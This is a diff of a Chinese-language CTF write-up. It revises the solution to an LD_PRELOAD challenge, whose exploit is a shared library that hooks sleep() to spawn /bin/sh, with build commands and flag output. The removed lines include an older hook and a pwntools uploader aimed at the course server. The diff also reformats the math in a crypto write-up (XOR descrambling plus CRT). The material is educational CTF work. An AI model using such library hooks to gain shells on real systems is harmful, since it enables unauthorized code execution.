@@ -181,64 +181,37 @@ nc edu-ctf.zoolab.org 10002
 Flag Format：FLAG{...}
 
 ### 解題思路
-這一題主要的想法很簡單，就是給他一個so file，然後她會直接用這個so file當作LD_PRELOAD，執行./chall，所以我們要做的事情概念很簡單，就是給他一個有問題的so file，然後當他執行椅面的function時，就會執行我們給他的惡意指令，例如開shell
+這一題主要的想法很簡單，就是給server一個so file，然後server會直接用這個so file當作LD_PRELOAD，並且執行./chall，所以我們要做的事情概念很簡單，就是給server一個經過hook的so file，然後當他執行sleep這個function時，就會執行我們給他的惡意指令，例如開shell
 
 ### Exploit
-```cpp
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdint.h>
-#include <dlfcn.h>
+* exp-hook.c
+    ```cpp
+    #define _GNU_SOURCE
+    #include <dlfcn.h>
+    #include <unistd.h>
 
-#define unlikely(x) __builtin_expect(!!(x), 0)
-#define TRY_LOAD_HOOK_FUNC(name) if (unlikely(!g_sys_##name)) {g_sys_##name = (sys_##name##_t)dlsym(RTLD_NEXT,#name);}
+    unsigned int sleep(unsigned int seconds) {
+        execve("/bin/sh", (char *[]){0}, (char *[]){0});
+        return 0; // hook sleep，立刻返回
+    }
+    ```
 
+* 實際結果: `main.py`其實就是一個助教寫好的loader，但後來發現還要經過不換行的base64 encode有點麻煩，如果是像我一樣直接load，就不需要管這個script
+    ```bash
+    $ gcc -fPIC -shared -o libmyhook.so exp-hook.c -ldl
+    $ LD_PRELOAD=./libmyhook.so ./chall    # To make sure it's working
+    $ ls
+    Makefile
+    chall
+    chall.c
+    flag.txt
+    main.py
+    run.sh
+    $ cat flag.txt
+    FLAG{B4by_Ld_Pr3L0aD_L1bR1rY_:)}
+    ```
 
-typedef void* (*sys_sleep_t)(size_t size);
-static sys_sleep_t g_sys_sleep = NULL;
-void* sleep(size_t size)
-{
-    execve("/bin/sh", (char *[]){0}, (char *[]){0});
-    return p;
-}
-```
-
-```python
-from base64 import b64encode
-from pwn import *
-
-ld_file = open('./libmyhook.so', 'rb').read()
-# r = process(['python', './main.py'])
-r = remote('edu-ctf.zoolab.org', 10002)
-
-print(r.recvline())
-raw_input()
-r.sendline(b64encode(ld_file))
-# print(b64encode(ld_file))
-
-r.interactive()
-```
-
-```bash
-$ gcc -fPIC -shared -o libmyhook.so exp-hook.c -ldl
-$ LD_PRELOAD=./libmyhook.so ./chall    # To make sure it's working
-$ python exp.py
-[+] Opening connection to edu-ctf.zoolab.org on port 10002: Done
-b'Give me your share object:\n'
-
-[*] Switching to interactive mode
-$ ls
-Makefile
-chall
-chall.c
-flag.txt
-main.py
-run.sh
-$ cat flag.txt
-FLAG{B4by_Ld_Pr3L0aD_L1bR1rY_:)}
-```
-
-我是直接參考[^libc-hook-zhihu]的教學，非常淺顯易懂，而且還有給sample code，做的事情簡單來說就和上面提到的一樣，當它call sleep時，就會直接執行execve開shell給我，另外這篇[^another-libc-hook-essay]的教學冶獎的很好
+我是直接參考[^libc-hook-zhihu]的教學，非常淺顯易懂，而且還有給sample code，做的事情簡單來說就和上面提到的一樣，當它call sleep時，就會直接執行execve開shell給我，另外這篇[^another-libc-hook-essay]的教學也講的很好
 
 
 ## Extreme Xorrrrr
@@ -281,27 +254,34 @@ print(f"mods = {xorrrrr(mods)}")
 我真的脫離crypto太久了，久沒做題就生疏了，這題其實也...沒那麼難，應該還是有點難啦
 1. Analyze Process
     首先這題做的事情很簡單，他先取得mods/muls各20組質數的list，然後和flag進行運算
+
     $$
     hint[0] = secret*muls[0]\ \%\ mods[0] \\
     ...
     $$
+
     最後他有給經過scramble的hint/muls/mods，所以首要做的事情是把scramble後的結果還原
 2. Descramble
     他做的事情其實很簡單，靜態看不太出來，動態跟一下就出現了，basically他就是做十九次，每一次都跟隔壁的element進行xor，例如：`muls[0, 1, 2, 3,..., 19]`，scramble的結果會變成
+
     $$
     muls[1\oplus 2\oplus 3\oplus ...\oplus 19,\\ 
     2\oplus 3\oplus 4\oplus ...\oplus 19\oplus 0,\\ 
     3\oplus 4\oplus 5\oplus ...\oplus 19\oplus 0\oplus 1,...]
     $$
+
     所以可以看得出來，因為只做19次，scramble後的第一個element缺少原本的element 0，而第二個element缺少原本的element 1，以此類推，所以要還原就很簡單了，我先把scramble後的所有element全部XOR，這樣就可以得到$0\oplus 1\oplus 2\oplus 3\oplus ...\oplus 19$的結果，然後再各自和scramble的element進行XOR，就可以extract出最一開始的element是多少
+
     $$
     Scrambled element = 1\oplus 2\oplus 3\oplus ...\oplus 19\\
     \oplus\\
     All\ element\ XOR = 0\oplus 1\oplus 2\oplus 3\oplus ...\oplus 19\\
     =original\ element\ 0
     $$
+
 3. Decrypt Flag
     有了hint/mods/muls最原始的這些東西，就可以開始想要怎麼藉由hint解密原本的flag，如果把整個equation換個表示式
+
     $$
     hint[0] = secret*muls[0]\ \%\ mods[0] \\
     ...\\
@@ -311,13 +291,16 @@ print(f"mods = {xorrrrr(mods)}")
     secret*muls[2]\equiv\ hint[2]\ (mod\ mods[2])\\
     ...
     $$
+
     這和CRT有一點像，但CRT解的問題是secret都要一樣，所以只要把兩邊同乘以${muls[i]}^{-1}$就可以了
+
     $$
     secret\equiv\ hint[0]*{muls[0]}^{-1}\ (mod\ mods[0])\\
     secret\equiv\ hint[1]*{muls[1]}^{-1}\ (mod\ mods[1])\\
     secret\equiv\ hint[2]*{muls[2]}^{-1}\ (mod\ mods[2])\\
     ...
     $$
+    
     再利用CRT的解法，secret就出來了
 
 ### Exploit
